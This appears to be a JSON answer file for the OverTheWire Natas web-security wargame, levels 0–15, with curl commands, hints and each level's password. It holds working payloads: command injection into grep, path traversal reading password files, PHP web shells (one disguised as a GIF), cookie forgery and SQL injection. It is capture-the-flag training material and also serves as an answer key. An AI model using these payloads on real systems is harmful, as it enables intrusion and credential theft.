@@ -1,0 +1,246 @@
+{
+ "title": "Natas",
+ "host": "natas.labs.overthewire.org",
+ "levels": [
+  {
+   "lvl": 0,
+   "user": "natas0",
+   "cmds": [
+    [
+     "curl -s -u natas0:natas0 http://natas0.natas.labs.overthewire.org/"
+    ]
+   ],
+   "out": [
+    "<!--The password for natas1 is ... -->"
+   ],
+   "pw": "scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7"
+  },
+  {
+   "lvl": 1,
+   "user": "natas1",
+   "cmds": [
+    [
+     "curl -s -u natas1:scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7 http://natas1.natas.labs.overthewire.org/"
+    ]
+   ],
+   "out": [
+    "<!--The password for natas2 is ... -->"
+   ],
+   "pw": "vsDOxoXyq3wckCP1ZmTZ71ngIA606odB"
+  },
+  {
+   "lvl": 2,
+   "user": "natas2",
+   "cmds": [
+    [
+     "curl -s -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/files/",
+     "curl -s -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/files/users.txt"
+    ]
+   ],
+   "out": [
+    "natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI"
+   ],
+   "pw": "K30JrSRHzjxq3paUQuwozY4MNvmNFyhI"
+  },
+  {
+   "lvl": 3,
+   "user": "natas3",
+   "cmds": [
+    [
+     "curl -s -u natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI http://natas3.natas.labs.overthewire.org/robots.txt",
+     "# Disallow: /s3cr3t/",
+     "curl -s -u natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt"
+    ]
+   ],
+   "out": [
+    "natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth"
+   ],
+   "pw": "JDrPnuZAKyl6MkiqQGFIddrqpvgOASth"
+  },
+  {
+   "lvl": 4,
+   "user": "natas4",
+   "cmds": [
+    [
+     "curl -s -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth -e http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/"
+    ]
+   ],
+   "out": [
+    "The password for natas5 is ..."
+   ],
+   "pw": "e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M"
+  },
+  {
+   "lvl": 5,
+   "user": "natas5",
+   "cmds": [
+    [
+     "curl -s -u natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M -H 'Cookie: loggedin=1' http://natas5.natas.labs.overthewire.org/"
+    ]
+   ],
+   "out": [
+    "You are logged in! The password for natas6 is ..."
+   ],
+   "pw": "7mhjtShJAcld2NYbKHEadnhEwRn2P8VT"
+  },
+  {
+   "lvl": 6,
+   "user": "natas6",
+   "cmds": [
+    [
+     "curl -s -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT http://natas6.natas.labs.overthewire.org/index.php~ source (linked on the page)",
+     "curl -s -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT http://natas6.natas.labs.overthewire.org/includes/secret.inc",
+     "curl -s -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT -d 'secret=<the secret>&submit=Submit' http://natas6.natas.labs.overthewire.org/"
+    ]
+   ],
+   "out": [
+    "The password for natas7 is ..."
+   ],
+   "pw": "B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0"
+  },
+  {
+   "lvl": 7,
+   "user": "natas7",
+   "cmds": [
+    [
+     "curl -s -u natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'"
+    ]
+   ],
+   "out": [
+    "(the page renders the password file itself)"
+   ],
+   "pw": "ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc"
+  },
+  {
+   "lvl": 8,
+   "user": "natas8",
+   "cmds": [
+    [
+     "# from the source: encodedSecret = hex2bin + strrev + base64-decode it back",
+     "curl -s -u natas8:ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc -d 'secret=oubWYf2kBq&submit=Submit' http://natas8.natas.labs.overthewire.org/"
+    ]
+   ],
+   "out": [
+    "The password for natas9 is ..."
+   ],
+   "pw": "UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9"
+  },
+  {
+   "lvl": 9,
+   "user": "natas9",
+   "cmds": [
+    [
+     "curl -s -u natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 --data-urlencode 'needle=; cat /etc/natas_webpass/natas10 #' http://natas9.natas.labs.overthewire.org/"
+    ]
+   ],
+   "out": [
+    "Output: ..."
+   ],
+   "pw": "EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv"
+  },
+  {
+   "lvl": 10,
+   "user": "natas10",
+   "cmds": [
+    [
+     "curl -s -u natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv --data-urlencode 'needle=. /etc/natas_webpass/natas11' http://natas10.natas.labs.overthewire.org/"
+    ]
+   ],
+   "out": [
+    "(grep happily searches the password file itself)"
+   ],
+   "pw": "VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd"
+  },
+  {
+   "lvl": 11,
+   "user": "natas11",
+   "cmds": [
+    [
+     "# known plaintext {\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"} XOR cookie bytes \u2192 key repeats: kBSw",
+     "# forge {\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"} with key kBSw, base64 it, send as the cookie",
+     "curl -s -u natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd -H 'Cookie: data=<forged>' http://natas11.natas.labs.overthewire.org/"
+    ]
+   ],
+   "out": [
+    "The password for natas12 is ..."
+   ],
+   "pw": "EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng"
+  },
+  {
+   "lvl": 12,
+   "user": "natas12",
+   "cmds": [
+    [
+     "echo '<?php system(\"cat /etc/natas_webpass/natas13\"); ?>' > shell.php",
+     "curl -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng -F 'file=@shell.php' -F 'filename=shell.php' http://natas12.natas.labs.overthewire.org/",
+     "curl -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng http://natas12.natas.labs.overthewire.org/upload/<random>.php (path shown after upload)"
+    ]
+   ],
+   "out": [
+    "(the shell prints the password)"
+   ],
+   "pw": "g8ba0olAzaSJuyS4gnmbdVVigAICLG1k"
+  },
+  {
+   "lvl": 13,
+   "user": "natas13",
+   "cmds": [
+    [
+     "printf 'GIF89a<?php system(\"cat /etc/natas_webpass/natas14\"); ?>' > shell.php",
+     "curl -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k -F 'file=@shell.php' -F 'filename=shell.php' http://natas13.natas.labs.overthewire.org/",
+     "# open the uploaded file (path shown after upload)"
+    ]
+   ],
+   "out": [
+    "GIF89a... followed by the password"
+   ],
+   "pw": "A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8"
+  },
+  {
+   "lvl": 14,
+   "user": "natas14",
+   "cmds": [
+    [
+     "curl -s -u natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8 --data-urlencode 'username=natas15\" OR \"1\"=\"1' --data-urlencode 'password=x' http://natas14.natas.labs.overthewire.org/"
+    ]
+   ],
+   "out": [
+    "Successful login! The password for natas15 is ..."
+   ],
+   "pw": "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g"
+  },
+  {
+   "lvl": 15,
+   "user": "natas15",
+   "cmds": [
+    [
+     "# for each position, ask: username = natas16\" AND password LIKE BINARY \"<prefix>%\" \u2014 'exists' means the guess is right",
+     "# 32 characters later:",
+     "curl -s -u natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g 'http://natas15.natas.labs.overthewire.org/?debug=1' (to confirm the query shape first)"
+    ]
+   ],
+   "out": [
+    "This user exists."
+   ],
+   "pw": "XyaxKkO8lCstVE1SBrFKvMqVGOsQCE9q"
+  }
+ ],
+ "goals": {
+  "0": "The password is right in the page source.",
+  "1": "Right-click is blocked by JavaScript \u2014 but only in a browser.",
+  "2": "The page loads an image from a browsable /files/ directory.",
+  "3": "Even Google won't find this one \u2014 but robots.txt talks.",
+  "4": "Access is granted only to visitors referred from the natas5 site.",
+  "5": "Login state lives in a cookie you control.",
+  "6": "The source code reveals a secret stored in an include file.",
+  "7": "An include parameter is used without any validation.",
+  "8": "The secret is 'encoded' in the source: bin2hex(strrev(base64(x))). Encoding is not encryption.",
+  "9": "A search form feeds your input straight into a grep command.",
+  "10": "Same form, but ; | & are filtered now. Spaces and grep's file arguments are not.",
+  "11": "The 'data' cookie is base64 of a repeating-key XOR of known JSON \u2014 recover the key and forge an admin cookie.",
+  "12": "An upload form keeps your file's .php extension.",
+  "13": "The upload now checks the file type with exif_imagetype \u2014 so make the PHP look like a GIF.",
+  "14": "A login form builds its SQL query with your username inside it.",
+  "15": "The form only says whether a user exists \u2014 a blind SQL injection oracle. Brute-force the password through it."
+ }
+}
